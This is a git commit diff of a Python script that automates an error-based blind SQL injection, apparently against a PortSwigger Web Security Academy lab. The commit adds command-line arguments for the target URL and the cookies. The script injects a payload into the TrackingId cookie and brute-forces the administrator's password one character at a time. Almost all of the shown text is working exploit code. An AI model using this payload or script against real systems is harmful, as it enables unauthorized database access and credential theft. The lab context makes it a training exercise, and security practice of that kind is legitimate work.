5b007baeca789d110b33c5b71a781439aefee5a5
“vtakdeniz <vtakdeniz@gmail.com>
2021-10-03 21:12:42 +0300

    Fixed a bug, added command line argument support

--- send_req.py
+++ send_req.py
@@ -1,21 +1,28 @@
 import requests
 import string
+import sys
 
-url="https://ac5e1fe91f88b3e0802352c200600024.web-security-academy.net/"
-#url="http://127.0.0.1:8081"
+arg_len = len(sys.argv)
+if arg_len<4:
+    print("Usage : url TrackingId session")
 
-password=[]
+url=sys.argv[1]
+TrackingId=sys.argv[2]
+session=sys.argv[3]
+print("Target :",url)
+print("Cookie params :",TrackingId,session)
+
 injection="'||(SELECT CASE WHEN SUBSTR(password,{},1)='{}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
-TrackingId="zcMfBbWviWaj3OLs"
-session="lIA8LfiJaLbS6R74qv2WXcQjJjss56kQ"
 cookie="TrackingId="+TrackingId+"{injection}; session="+session
-header_dict={"Cookie": "TrackingId=zcMfBbWviWaj3OLs session=lIA8LfiJaLbS6R74qv2WXcQjJjss56kQ",
+header_dict={
 "Connection": "close",
 "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
 }
+
+password=[]
 for i in range(1,21):
     print("\nindex : "+str(i))
-    for st in string.printable[1:42]:
+    for st in string.printable[0:40]:
         header_dict["Cookie"]=cookie.format(injection=injection.format(i,st))
         print("Cookie : "+header_dict["Cookie"],end="\r")
         response = requests.get(url,headers=header_dict)
